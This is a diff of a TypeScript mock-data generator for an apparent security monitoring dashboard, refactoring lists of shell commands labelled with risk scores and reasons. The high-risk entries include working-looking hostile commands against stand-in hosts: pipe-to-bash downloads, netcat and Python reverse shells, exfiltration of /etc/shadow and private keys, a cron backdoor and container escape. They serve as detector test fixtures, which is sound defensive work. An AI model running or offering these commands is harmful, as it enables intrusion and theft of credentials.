@@ -10,353 +10,87 @@ export interface Event {
 }
 
 const HIGH_RISK_COMMANDS = [
-  {
-    line: "nmap -sS 192.168.1.0/24",
-    score: 0.95,
-    alert: true,
-    reason: "Network scanning tool used for reconnaissance. SYN scan is often used by attackers to identify open ports."
-  },
-  {
-    line: "chmod 777 /etc/passwd",
-    score: 0.90,
-    alert: true,
-    reason: "Granting full permissions to a critical system file is a severe privilege escalation attempt."
-  },
-  {
-    line: "curl http://malicious.com/payload.sh | bash",
-    score: 0.92,
-    alert: true,
-    reason: "Remote code execution: downloading and executing arbitrary shell script from untrusted source."
-  },
-  {
-    line: "nc -l -p 4444 -e /bin/bash",
-    score: 0.88,
-    alert: true,
-    reason: "Establishing a reverse shell using netcat, common technique for maintaining unauthorized access."
-  },
-  {
-    line: "base64 -d /etc/shadow | curl -X POST http://attacker.com",
-    score: 0.94,
-    alert: true,
-    reason: "Data exfiltration: decoding and transmitting sensitive password hash file to external server."
-  },
-  {
-    line: "masscan -p1-65535 10.0.0.0/8 --rate=1000",
-    score: 0.96,
-    alert: true,
-    reason: "High-speed network scanning across large IP range. Masscan is specifically designed for rapid reconnaissance."
-  },
-  {
-    line: "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\"",
-    score: 0.93,
-    alert: true,
-    reason: "Python reverse shell payload establishing persistent backdoor connection to external server."
-  },
-  {
-    line: "find / -name '*.key' -exec cat {} \\; | curl -X POST -d @- http://exfil.com",
-    score: 0.91,
-    alert: true,
-    reason: "Searching for cryptographic keys and exfiltrating them to external server - severe data breach."
-  },
-  {
-    line: "kubectl create secret generic backdoor --from-literal=token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
-    score: 0.89,
-    alert: true,
-    reason: "Extracting Kubernetes service account token and creating secret - potential cluster compromise."
-  },
-  {
-    line: "iptables -A INPUT -p tcp --dport 22 -j ACCEPT && iptables -A INPUT -j DROP",
-    score: 0.87,
-    alert: true,
-    reason: "Modifying firewall rules to block all traffic except SSH - potential DoS or access control bypass."
-  },
-  {
-    line: "echo '*/1 * * * * curl -s http://c2.com/update.sh | bash' | crontab -",
-    score: 0.92,
-    alert: true,
-    reason: "Installing persistent cron job to download and execute remote scripts every minute - backdoor installation."
-  },
-  {
-    line: "docker run --privileged --net=host -v /:/host alpine chroot /host /bin/bash",
-    score: 0.94,
-    alert: true,
-    reason: "Privileged container escape attempt using host networking and filesystem access - container breakout."
-  }
+  { line: "nmap -sS 192.168.1.0/24", score: 0.95, alert: true, reason: "Network scanning - SYN scan for reconnaissance" },
+  { line: "chmod 777 /etc/passwd", score: 0.90, alert: true, reason: "Privilege escalation on critical system file" },
+  { line: "curl http://malicious.com/payload.sh | bash", score: 0.92, alert: true, reason: "Remote code execution from untrusted source" },
+  { line: "nc -l -p 4444 -e /bin/bash", score: 0.88, alert: true, reason: "Reverse shell using netcat" },
+  { line: "base64 -d /etc/shadow | curl -X POST http://attacker.com", score: 0.94, alert: true, reason: "Data exfiltration of password hashes" },
+  { line: "python3 -c 'import socket...'", score: 0.93, alert: true, reason: "Python reverse shell connection" },
+  { line: "echo '*/*1***root*curl*http://c2.com' >> /etc/crontab", score: 0.91, alert: true, reason: "Backdoor via cron job modification" },
+  { line: "iptables -F && iptables -P INPUT ACCEPT", score: 0.87, alert: true, reason: "Disabling firewall rules" },
+  { line: "docker run --privileged --pid=host", score: 0.85, alert: true, reason: "Container escape with privileged access" },
+  { line: "kubectl exec -it pod -- /bin/bash", score: 0.82, alert: true, reason: "Direct pod shell access - potential lateral movement" },
 ];
 
 const MEDIUM_RISK_COMMANDS = [
-  {
-    line: "wget https://example.com/script.sh",
-    score: 0.45,
-    alert: false,
-    reason: "Downloading external script - potentially risky depending on source trustworthiness."
-  },
-  {
-    line: "ssh root@192.168.1.100",
-    score: 0.38,
-    alert: false,
-    reason: "SSH connection to remote host - legitimate but requires monitoring for unauthorized access."
-  },
-  {
-    line: "docker exec -it container /bin/sh",
-    score: 0.42,
-    alert: false,
-    reason: "Container shell access - normal admin operation but can be used for lateral movement."
-  },
-  {
-    line: "curl -X POST https://api.external-service.com/webhook -d @sensitive.json",
-    score: 0.48,
-    alert: false,
-    reason: "Sending data to external service - legitimate integration but requires monitoring for data exfiltration."
-  },
-  {
-    line: "kubectl port-forward svc/database 5432:5432",
-    score: 0.35,
-    alert: false,
-    reason: "Port forwarding database service - normal debugging operation but exposes internal services."
-  },
-  {
-    line: "tcpdump -i eth0 -w capture.pcap",
-    score: 0.40,
-    alert: false,
-    reason: "Network packet capture - legitimate monitoring but can capture sensitive data in transit."
-  },
-  {
-    line: "python3 -m http.server 8080",
-    score: 0.43,
-    alert: false,
-    reason: "Starting HTTP server - normal development tool but can expose filesystem if misconfigured."
-  },
-  {
-    line: "kubectl get secrets --all-namespaces",
-    score: 0.37,
-    alert: false,
-    reason: "Listing all secrets across namespaces - administrative operation but requires high privileges."
-  },
-  {
-    line: "docker run -p 8080:80 nginx",
-    score: 0.32,
-    alert: false,
-    reason: "Running container with port mapping - normal deployment but exposes service to network."
-  },
-  {
-    line: "curl -k https://internal-api.company.com/health",
-    score: 0.41,
-    alert: false,
-    reason: "HTTPS request with certificate verification disabled - bypasses security controls."
-  },
-  {
-    line: "kubectl logs -f deployment/app --tail=1000",
-    score: 0.33,
-    alert: false,
-    reason: "Following application logs - normal debugging but may contain sensitive information."
-  },
-  {
-    line: "docker save myapp:latest | gzip > backup.tar.gz",
-    score: 0.36,
-    alert: false,
-    reason: "Creating container image backup - normal operation but creates large files that could contain sensitive data."
-  }
+  { line: "ps aux | grep -i password", score: 0.55, alert: false, reason: "Searching for passwords in running processes" },
+  { line: "find / -name '*.pem' -o -name '*.key'", score: 0.58, alert: false, reason: "Searching for private keys across filesystem" },
+  { line: "tcpdump -i eth0 -w capture.pcap", score: 0.52, alert: false, reason: "Network traffic capture - potential eavesdropping" },
+  { line: "cat /etc/passwd /etc/group", score: 0.48, alert: false, reason: "Reading user and group information" },
+  { line: "docker run --network=host alpine", score: 0.50, alert: false, reason: "Container using host network - reduced isolation" },
+  { line: "kubectl get secrets -A", score: 0.56, alert: false, reason: "Accessing all secrets across namespaces" },
+  { line: "ssh-keygen -t rsa && cat ~/.ssh/id_rsa.pub", score: 0.45, alert: false, reason: "SSH key generation and exposure" },
+  { line: "netstat -tulpn | grep LISTEN", score: 0.42, alert: false, reason: "Scanning for listening ports and services" },
+  { line: "curl -s https://ipinfo.io/ip", score: 0.47, alert: false, reason: "External IP lookup - potential reconnaissance" },
+  { line: "kubectl port-forward svc/admin 8080:80", score: 0.53, alert: false, reason: "Port forwarding to admin service" },
 ];
 
 const LOW_RISK_COMMANDS = [
-  {
-    line: "ls -la /home",
-    score: 0.05,
-    alert: false,
-    reason: "Normal file listing command for viewing directory contents."
-  },
-  {
-    line: "ps aux",
-    score: 0.08,
-    alert: false,
-    reason: "Standard command for displaying running processes."
-  },
-  {
-    line: "cat /var/log/app.log",
-    score: 0.10,
-    alert: false,
-    reason: "Reading application logs - normal troubleshooting activity."
-  },
-  {
-    line: "df -h",
-    score: 0.06,
-    alert: false,
-    reason: "Checking disk space usage - routine system monitoring."
-  },
-  {
-    line: "kubectl get pods",
-    score: 0.12,
-    alert: false,
-    reason: "Kubernetes resource inspection - standard administrative operation."
-  },
-  {
-    line: "kubectl get nodes",
-    score: 0.08,
-    alert: false,
-    reason: "Listing cluster nodes - normal administrative operation."
-  },
-  {
-    line: "docker ps",
-    score: 0.07,
-    alert: false,
-    reason: "Listing running containers - standard container management."
-  },
-  {
-    line: "kubectl describe pod myapp-123",
-    score: 0.09,
-    alert: false,
-    reason: "Inspecting specific pod details - normal debugging operation."
-  },
-  {
-    line: "kubectl top pods",
-    score: 0.11,
-    alert: false,
-    reason: "Checking resource usage - standard monitoring command."
-  },
-  {
-    line: "kubectl get services",
-    score: 0.06,
-    alert: false,
-    reason: "Listing Kubernetes services - normal cluster inspection."
-  },
-  {
-    line: "kubectl get deployments",
-    score: 0.07,
-    alert: false,
-    reason: "Listing deployments - standard application management."
-  },
-  {
-    line: "kubectl get namespaces",
-    score: 0.05,
-    alert: false,
-    reason: "Listing namespaces - basic cluster administration."
-  },
-  {
-    line: "kubectl config current-context",
-    score: 0.04,
-    alert: false,
-    reason: "Checking current Kubernetes context - standard configuration check."
-  },
-  {
-    line: "kubectl version",
-    score: 0.03,
-    alert: false,
-    reason: "Checking Kubernetes version - normal system information."
-  },
-  {
-    line: "kubectl get events",
-    score: 0.10,
-    alert: false,
-    reason: "Listing cluster events - standard troubleshooting operation."
-  },
-  {
-    line: "kubectl get configmaps",
-    score: 0.08,
-    alert: false,
-    reason: "Listing configuration maps - normal configuration management."
-  },
-  {
-    line: "kubectl get ingress",
-    score: 0.09,
-    alert: false,
-    reason: "Listing ingress resources - standard networking configuration check."
-  },
-  {
-    line: "kubectl rollout status deployment/myapp",
-    score: 0.06,
-    alert: false,
-    reason: "Checking deployment rollout status - normal application management."
-  },
-  {
-    line: "kubectl get persistentvolumes",
-    score: 0.07,
-    alert: false,
-    reason: "Listing persistent volumes - standard storage management."
-  },
-  {
-    line: "kubectl get networkpolicies",
-    score: 0.11,
-    alert: false,
-    reason: "Listing network policies - standard security configuration check."
-  }
+  { line: "kubectl get pods", score: 0.11, alert: false, reason: "Listing pods - standard operation" },
+  { line: "kubectl get nodes", score: 0.09, alert: false, reason: "Listing nodes - normal monitoring" },
+  { line: "kubectl logs pod-name", score: 0.12, alert: false, reason: "Reading pod logs - standard debugging" },
+  { line: "docker ps", score: 0.08, alert: false, reason: "Listing containers - standard operation" },
+  { line: "kubectl describe service", score: 0.10, alert: false, reason: "Inspecting service details" },
+  { line: "kubectl get deployments", score: 0.07, alert: false, reason: "Listing deployments - normal operation" },
+  { line: "cat /proc/cpuinfo", score: 0.05, alert: false, reason: "Reading CPU info - system monitoring" },
+  { line: "df -h", score: 0.04, alert: false, reason: "Checking disk usage - standard maintenance" },
+  { line: "kubectl version", score: 0.03, alert: false, reason: "Checking Kubernetes version" },
+  { line: "kubectl top pods", score: 0.06, alert: false, reason: "Monitoring pod resource usage" },
 ];
 
-let eventCounter = 0;
-const generatedEvents: Event[] = [];
+let mockEvents: Event[] = [];
 
-function getRandomCommand() {
+const generateId = () => Math.random().toString(36).substring(2, 15);
+
+const getRandomCommand = () => {
   const rand = Math.random();
   if (rand < RISK_DISTRIBUTION.HIGH) {
-    return HIGH_RISK_COMMANDS[Math.floor(Math.random() * HIGH_RISK_COMMANDS.length)];
+    const cmd = HIGH_RISK_COMMANDS[Math.floor(Math.random() * HIGH_RISK_COMMANDS.length)];
+    return { ...cmd };
   } else if (rand < RISK_DISTRIBUTION.MEDIUM) {
-    return MEDIUM_RISK_COMMANDS[Math.floor(Math.random() * MEDIUM_RISK_COMMANDS.length)];
+    const cmd = MEDIUM_RISK_COMMANDS[Math.floor(Math.random() * MEDIUM_RISK_COMMANDS.length)];
+    return { ...cmd };
   } else {
-    return LOW_RISK_COMMANDS[Math.floor(Math.random() * LOW_RISK_COMMANDS.length)];
+    const cmd = LOW_RISK_COMMANDS[Math.floor(Math.random() * LOW_RISK_COMMANDS.length)];
+    return { ...cmd };
   }
-}
+};
 
-export function generateMockEvent(): Event {
+export const generateMockEvent = (): Event => {
   const cmd = getRandomCommand();
-  const event: Event = {
-    id: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
+  return {
+    id: generateId(),
+    time: new Date().toISOString(),
     ...cmd,
-    time: new Date(Date.now() - eventCounter * 10000).toISOString()
   };
-  eventCounter++;
-  return event;
-}
+};
 
-export function initializeMockData(): Event[] {
-  if (generatedEvents.length === 0) {
-    for (let i = 0; i < EVENT_CONFIG.INITIAL_EVENTS_COUNT; i++) {
-      generatedEvents.push(generateMockEvent());
-    }
+export const initializeMockData = () => {
+  mockEvents = Array.from({ length: EVENT_CONFIG.INITIAL_EVENTS_COUNT }, () => generateMockEvent());
+};
+
+export const addNewMockEvent = () => {
+  const newEvent = generateMockEvent();
+  mockEvents.unshift(newEvent);
+  if (mockEvents.length > EVENT_CONFIG.MAX_EVENTS) {
+    mockEvents.pop();
   }
-  return generatedEvents;
-}
+};
 
-export function addNewMockEvent(): Event {
-  const cmd = getRandomCommand();
-  const newEvent: Event = {
-    id: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
-    ...cmd,
-    time: new Date().toISOString()
-  };
-  
-  generatedEvents.unshift(newEvent);
-  
-  if (generatedEvents.length > EVENT_CONFIG.MAX_EVENTS) {
-    generatedEvents.pop();
-  }
-  
-  return newEvent;
-}
-
-export function getMockEvents(): Event[] {
-  return [...generatedEvents];
-}
-
-export function generateBulkTestData(count: number = EVENT_CONFIG.BULK_GENERATE_COUNT): Event[] {
-  const newEvents: Event[] = [];
-  const baseTime = Date.now();
-  const timeIntervalMs = 1000;
-  
+export const generateBulkTestData = (count: number) => {
   for (let i = 0; i < count; i++) {
-    const cmd = getRandomCommand();
-    const event: Event = {
-      id: `${baseTime}-${i}-${Math.random().toString(36).substr(2, 9)}`,
-      ...cmd,
-      time: new Date(baseTime - i * timeIntervalMs).toISOString()
-    };
-    newEvents.push(event);
+    addNewMockEvent();
   }
-  
-  generatedEvents.unshift(...newEvents);
-  
-  if (generatedEvents.length > EVENT_CONFIG.MAX_EVENTS) {
-    generatedEvents.splice(EVENT_CONFIG.MAX_EVENTS);
-  }
-  
-  return newEvents;
-}
+};
+
+export const getMockEvents = (): Event[] => mockEvents;
